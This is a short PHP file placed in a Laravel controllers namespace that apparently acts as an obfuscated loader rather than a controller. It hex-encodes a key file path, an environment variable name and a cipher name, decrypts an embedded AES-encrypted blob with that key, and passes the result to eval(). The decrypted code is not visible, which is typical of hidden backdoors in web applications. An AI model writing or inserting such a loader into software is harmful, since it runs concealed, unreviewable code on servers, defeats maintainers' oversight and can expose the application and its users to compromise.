<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('W5/K+2OsqnopKzLAngLtrw==');

$c=base64_decode(

'hoC6lrMlEoTPTbILfSB0mehDTSPLeYQ56nQjyAhUB/1GNFVfVsYhYw94YAZIIS4K8TAZ4rQOHoE3' .
'RFLRuuCDTotFQzyKjuXrENuVpyIvskq1xaZMPnOpZ7iTmbL6mHXzxBB56sDHX4uQSGIpy7SguFhx' .
'XTXEZGYi34+E7Tg48JjKUiosbzDQpTIpjhBo+s6kjdKsY5AqUzWk98n5MUuPz1+R1sY1CbeRtb5Q' .
'L8+hTvWKnYi9lqx40uoznrd2n5qH'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

